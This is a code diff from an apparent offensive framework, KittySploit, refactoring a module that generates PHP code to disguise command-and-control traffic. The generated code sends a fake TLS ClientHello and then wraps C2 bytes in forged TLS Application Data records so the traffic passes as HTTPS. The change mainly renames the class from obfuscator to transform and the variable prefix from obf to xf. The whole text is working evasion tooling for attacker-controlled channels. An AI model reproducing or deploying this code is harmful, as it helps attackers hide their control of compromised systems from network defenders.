@@ -2,19 +2,21 @@
 # -*- coding: utf-8 -*-
 
 from typing import Optional
-from modules.obfuscators.python.protocol.https_mimic import (
+
+from kittysploit import Transform
+from modules.transforms.python.protocol.https_mimic import (
     CLIENT_HELLO_BYTES,
-    Module as PythonHttpsObfuscator,
+    Module as PythonHttpsTransform,
 )
 
 
-class Module(PythonHttpsObfuscator):
-    """PHP HTTPS/TLS record mimic obfuscator."""
+class Module(Transform, PythonHttpsTransform):
+    """PHP HTTPS/TLS record mimic transform."""
 
     SUPPORTED_CLIENT_LANGUAGES = ["php"]
 
     __info__ = {
-        "name": "PHP HTTPS Mimic Obfuscator",
+        "name": "PHP HTTPS Mimic Transform",
         "description": "Sends a fake TLS ClientHello then wraps C2 bytes in TLS Application Data records.",
         "author": "KittySploit Team",
         "version": "1.0.0",
@@ -25,12 +27,12 @@ class Module(PythonHttpsObfuscator):
             return None
         hello_hex = CLIENT_HELLO_BYTES.hex()
         return (
-            f"$obf_client_hello=hex2bin('{hello_hex}');$obf_buf='';$obf_first=true;"
-            "function _obf_encode($d){global $obf_client_hello,$obf_first;if($d===''){return $d;}$out='';"
-            "if($obf_first){$out.=$obf_client_hello;$obf_first=false;}"
+            f"$xf_client_hello=hex2bin('{hello_hex}');$xf_buf='';$xf_first=true;"
+            "function _xf_encode($d){global $xf_client_hello,$xf_first;if($d===''){return $d;}$out='';"
+            "if($xf_first){$out.=$xf_client_hello;$xf_first=false;}"
             "$i=0;$l=strlen($d);while($i<$l){$c=substr($d,$i,16384);$i+=strlen($c);$n=strlen($c);$out.=chr(0x17).chr(0x03).chr(0x03).chr(($n>>8)&255).chr($n&255).$c;}return $out;}"
-            "function _obf_decode($d){global $obf_buf;$obf_buf.=$d;$out='';"
-            "while(strlen($obf_buf)>=5){$rt=ord($obf_buf[0]);$ln=(ord($obf_buf[3])<<8)|ord($obf_buf[4]);"
-            "if($ln>16384){$obf_buf=substr($obf_buf,1);continue;}if(strlen($obf_buf)<5+$ln){break;}"
-            "if($rt===0x17){$out.=substr($obf_buf,5,$ln);}$obf_buf=substr($obf_buf,5+$ln);}return $out;}"
+            "function _xf_decode($d){global $xf_buf;$xf_buf.=$d;$out='';"
+            "while(strlen($xf_buf)>=5){$rt=ord($xf_buf[0]);$ln=(ord($xf_buf[3])<<8)|ord($xf_buf[4]);"
+            "if($ln>16384){$xf_buf=substr($xf_buf,1);continue;}if(strlen($xf_buf)<5+$ln){break;}"
+            "if($rt===0x17){$out.=substr($xf_buf,5,$ln);}$xf_buf=substr($xf_buf,5+$ln);}return $out;}"
         )
